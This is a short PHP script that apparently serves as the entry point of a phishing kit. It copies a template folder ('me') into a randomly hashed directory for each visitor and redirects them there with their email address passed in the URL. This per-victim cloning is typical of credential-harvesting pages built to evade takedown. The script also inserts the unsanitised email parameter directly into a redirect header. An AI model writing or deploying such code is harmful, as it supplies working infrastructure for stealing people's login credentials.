<?php

include_once("me/helper.php");

function recurse_copy($src, $dst)
{
    $dir = opendir($src);
    @mkdir($dst);
    while (false !== ($file = readdir($dir))) {
        if (($file != '.') && ($file != '..')) {
            if (is_dir($src . '/' . $file)) {
                recurse_copy($src . '/' . $file, $dst . '/' . $file);
            } else {
                copy($src . '/' . $file, $dst . '/' . $file);
                chmod($dst . '/' . $file, 0755);
            }
        }
    }
    closedir($dir);
}

session_start();
$_SESSION['referer'] = isset($_SERVER['REQUEST_URI']) ? $_SERVER['HTTP_REFERER'] : '';

$email = $_GET['email'];
$random = rand(0, 1000000000000);
$md5 = md5("$random");
$base = base64_encode($md5);
$dst = md5("$base");

$_SESSION['dir'] = $dst;
$src = "me";

recurse_copy($src, $dst);
header("Location: $dst/index.php?email=$email");
?>